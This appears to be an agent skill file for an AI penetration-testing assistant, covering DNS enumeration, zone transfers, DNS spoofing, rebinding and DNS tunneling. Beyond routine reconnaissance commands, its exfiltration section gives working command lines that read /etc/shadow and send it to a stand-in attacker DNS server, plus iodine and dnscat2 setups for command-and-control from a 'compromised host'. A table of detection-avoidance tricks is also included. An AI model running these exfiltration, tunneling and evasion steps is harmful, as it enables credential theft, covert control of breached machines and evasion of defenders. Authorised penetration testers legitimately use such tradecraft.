---
name: DNS Attacks & Enumeration
description: DNS enumeration, zone transfers, DNS spoofing, DNS tunneling, and subdomain discovery techniques
---

# DNS Attacks & Enumeration

Pull this skill when you need to enumerate DNS records, discover subdomains, exfiltrate data via DNS, or set up malicious DNS resolution for MITM attacks.

## Tool wiring

| Action | Tool | Notes |
|--------|------|-------|
| DNS enumeration | `kali_shell` — `dnsrecon`, `dnsenum` | Comprehensive record enumeration |
| Zone transfer | `kali_shell` — `dig`, `dnsrecon` | AXFR attempt |
| Subdomain discovery | `kali_shell` — `subfinder`, `amass`, `gobuster dns` | Wordlist + brute-force |
| DNS spoofing | `kali_shell` — `bettercap`, `dnsspoof` | MITM fake DNS responses |
| DNS tunneling | `kali_shell` — `iodine`, `dnscat2` | Data exfiltration, C2 |
| Record lookup | `kali_shell` — `dig`, `nslookup`, `host` | Quick lookups |
| Bulk resolution | `kali_shell` — `massdns` | Millions of lookups per minute |

> **Availability**: dig, nslookup, host pre-installed. dnsrecon, dnsenum, massdns, gobuster, iodine may need `apt install`.

## Primer

DNS is a foundational protocol that is almost always permitted through firewalls. This makes it valuable for both reconnaissance (enumerating the target's attack surface via DNS records) and as a covert channel (tunneling data or C2 traffic inside DNS queries).

## Reconnaissance phase

### Basic record enumeration
```bash
dig A example.com
dig AAAA example.com
dig MX example.com
dig NS example.com
dig TXT example.com
dig CNAME www.example.com
dig ANY example.com  # Modern NS may refuse
```

### Zone transfer (AXFR)
```bash
# Attempt direct zone transfer from each nameserver
dig @ns1.example.com example.com AXFR

# Automated via dnsrecon:
dnsrecon -d example.com -t axfr

# If successful, you get ALL DNS records for the domain
```

### Subdomain enumeration

#### With subfinder (API-based, fastest)
```bash
subfinder -d example.com -o subdomains.txt
```

#### With amass (deepest)
```bash
amass enum -d example.com -o subdomains.txt
```

#### With gobuster (wordlist brute-force)
```bash
gobuster dns -d example.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
```

#### With massdns (high-speed bulk)
```bash
massdns -r /usr/share/massdns/lists/resolvers.txt -t A -o S -w massdns.out subdomains.txt
```

### Reverse DNS (PTR records)
```bash
# Find domains hosted on the same IP range
dig -x 192.0.2.50

# Scan an IP range for PTR records
for i in $(seq 1 255); do dig -x 192.0.2.$i +short; done
```

### DNS cache snooping
```bash
# Check if a recursive resolver has cached a specific record
dig @resolver-ip example.com +norecurse
# If the answer section is non-empty, it was cached
```

## Attack phase

### DNS spoofing (MITM)
```bash
# With dnsspoof:
echo "192.168.1.50 *.example.com" > /tmp/dnsspoof.hosts
dnsspoof -i eth0 -f /tmp/dnsspoof.hosts

# With bettercap:
# set dns.spoof.all true
# set dns.spoof.address 192.168.1.50
# dns.spoof on
```

### DNS rebinding
```bash
# Use a DNS rebinding tool to bypass same-origin policy
# Approach: Serve DNS that alternates between two IPs:
#   T=0: resolves to 127.0.0.1   (passes initial check)
#   T=1: resolves to internal IP  (second request targets internal service)

# Tools: singleshot.rb, rebind, or custom Python with dnslib
```

## Exfiltration phase

### DNS tunneling with iodine
```bash
# On your public server (server-side):
iodined -f -c -P yourpassword your-public-ip your-tunnel-domain.com

# On compromised host (client):
iodine -f -P yourpassword your-public-server your-tunnel-domain.com

# Now you have a virtual network interface (dns0) — route through it
ifconfig dns0
ssh user@10.0.0.1  # iodine creates a /27 network by default
```

### DNS tunneling with dnscat2
```bash
# On your public server:
ruby dnscat2.rb your-tunnel-domain.com

# On compromised host:
./dnscat2 --dns server=your-public-server,domain=tunnel-domain.com
```

### Data exfiltration via DNS queries
```bash
# Simple — each query leaks bytes:
# Attacker-controlled DNS server receives: 
#   <base64-encoded-data>.exfil.your-domain.com

# On compromised host:
cat /etc/shadow | base64 | while read line; do
  dig @your-dns-server "${line:0:63}.exfil.your-domain.com"
done

# Better: use a proper exfil tool like dnsteal:
dnsteal -s your-public-server -f /etc/shadow
```

## Detection avoidance

| Technique | OPSEC note |
|-----------|------------|
| Use TXT queries | Less commonly monitored than A records |
| Low query rate | < 1 query/second to avoid rate limiting |
| Randomize subdomains | Use random prefixes to avoid pattern detection |
| Use public resolvers | Query through 8.8.8.8 instead of target's DNS |
| Encrypt tunnel payload | Base64 is not encryption — use XOR or AES on top |

## Validation shape

A DNS finding should include:
- **Domain(s)**: Target domain, nameservers, SOA
- **Records found**: A, AAAA, MX, TXT, NS, CNAME with values
- **Zone transfer**: Success/fail. If successful, attach the full zone dump
- **Subdomains**: Count, notable findings (admin panels, dev/staging)
- **Vulnerability type**: Zone transfer, cache snooping, spoofing, tunnel

## False positives

- **Zone transfer refused** (status: REFUSED): Standard behaviour on properly configured DNS. Not a vulnerability.
- **Empty ANSWER section on recursive query**: Cache miss, not necessarily a security issue.
- **Wildcard DNS records**: `dig nonexistent.example.com` returns an IP — the domain uses wildcards. Filter these out of subdomain results.
- **DNS resolver is authoritative, not recursive**: Some resolvers only serve their own zones. Try a different resolver IP.

## Hand-off

- After finding internal hostnames: `-> /skill network/pivoting_tunneling` to reach internal ranges
- After finding subdomains: `-> /skill tooling/httpx` to probe for live HTTP services
- For zone transfer findings: `-> /skill vulnerabilities/information_disclosure`
- For DNS tunneling: `-> /skill post_exploitation/linux_privesc` (if you need to escalate to persist the tunnel)
- After discovering cloud-hosted domains: `-> /skill cloud/aws` or `-> /skill cloud/azure`

## Pro tips

- **Always try AXFR on every NS** — even if one refuses, another may allow it. Misconfigured authoritative servers are common.
- **TXT records are gold** — they often contain SPF/DKIM (reveals mail server IPs), verification tokens (think GitHub/Let's Encrypt), and occasionally credentials or API keys.
- **Wildcards hide real subdomains** — use `-fw` (filter wildcard) in amass or manually check by resolving random strings.
- **Massdns speed**: A single-threaded dig takes ~1s per query. Massdns can do 100k+ queries/minute with 1M+ wordlist files.
- **DNS tunneling** is slow (~10-50 Kbps) but extremely reliable — DNS is almost never fully blocked. Use it as a last-resort C2 channel.
